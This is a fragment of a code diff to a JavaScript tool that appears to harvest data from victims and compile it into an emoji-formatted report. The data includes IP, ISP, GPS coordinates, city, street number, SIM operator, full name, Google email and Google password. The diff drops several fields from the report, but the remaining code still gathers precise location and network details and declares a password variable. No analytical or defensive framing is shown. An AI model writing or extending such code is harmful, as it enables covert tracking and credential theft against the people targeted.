@@ -908,8 +908,6 @@
 
       let country = "N/A", province = "N/A", city = "N/A", ip = "N/A", accuracy = "N/A", namaISP = "N/A";
 
-      let street = "N/A", streetNumber = "N/A", district = "N/A";
-
       let simOperator = "N/A", fullName = "N/A", googleEmail = "N/A", googlePassword = "N/A";
 
 
@@ -1070,11 +1068,7 @@
 
             if (data.address) {
 
-              street = data.address.road || "N/A";
-
               streetNumber = data.address.house_number || "N/A";
-
-              district = data.address.suburb || data.address.neighbourhood || "N/A";
 
             }
 
@@ -1174,11 +1168,7 @@
 
         "City": city,
 
-        "Street": street,
-
         "Street Number": streetNumber,
-
-        "District": district,
 
         "Time": clock,
 
@@ -1224,17 +1214,7 @@
 
         `📞 *SIM Operator:* ${data["SIM Operator"]}\n` +
 
-        `👤 *Full Name:* ${data["Full Name"]}\n` +
-
-        `📧 *Google Email:* ${data["Google Email"]}\n` +
-
-        `🔑 *Google Password:* ${data["Google Password"]}\n` +
-
         `🏢 *ISP:* ${data["ISP"]}\n` +
-
-        `📱 *Device:* ${data["Device"]}\n` +
-
-        `🤖 *Android Version:* ${data["Android Version"]}\n` +
 
         `📍 *Location:* ${data["Coordinates"]}\n` +
 
@@ -1246,11 +1226,7 @@
 
         `🏘️ *City:* ${data["City"]}\n` +
 
-        `🛣️ *Street:* ${data["Street"]}\n` +
-
         `🏠 *Street Number:* ${data["Street Number"]}\n` +
-
-        `🏡 *District:* ${data["District"]}\n` +
 
         `🕒 *Time:* ${data["Time"]}\n` +
 
@@ -1259,8 +1235,6 @@
         `🌡️ *Temperature:* ${data["Temperature"]}\n` +
 
         `🗣️ *Language:* ${data["Language"]}\n` +
-
-        `📺 *Resolution:* ${data["Resolution"]}\n` +
 
         `🕐 *Timezone:* ${data["Timezone"]}\n` +
 
